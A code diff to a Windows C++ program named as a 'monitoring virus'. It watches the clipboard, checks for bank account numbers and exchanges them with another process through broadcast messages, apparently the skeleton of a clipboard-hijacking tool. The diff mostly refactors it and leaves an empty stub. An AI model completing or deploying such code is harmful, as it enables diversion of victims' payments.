@@ -1,12 +1,12 @@
 ﻿#include "main.h"
 
-const char szClassName[] = "WirusMonitorujacy";
-bool bAset;
+constexpr char szClassName[] = "WirusMonitorujacy";
 LPSTR bankAccount;
 HWND hwndThis;
 HWND hwndNextViewer;
 UINT messageCode;
 time_t start, current;
+bool bAset;
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
@@ -24,7 +24,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 		if (diff >= 60.0)
 		{
 			// Wysłanie żądania do procesu nadawcy o konto bankowe
-			PostMessage(HWND_BROADCAST, messageCode, 0, 0);
+			PostMessage(HWND_BROADCAST, messageCode, REQUEST_NUMBER, 0);
 			time(&start);
 		}
 	}
@@ -81,8 +81,9 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 	{
 		switch (wParam)
 		{
-		case 1:
-			memcpy(bankAccount, &lParam, 17);
+		case POST_NUMBER:
+			saveNumber();
+			//memcpy(bankAccount, &lParam, MAXL + 1);
 			bAset = true;
 			break;
 		}
@@ -171,4 +172,9 @@ bool CheckIfAccountNumber(LPSTR str)
 				return false;
 		}
 	return true;
+}
+
+void saveNumber()
+{
+
 }
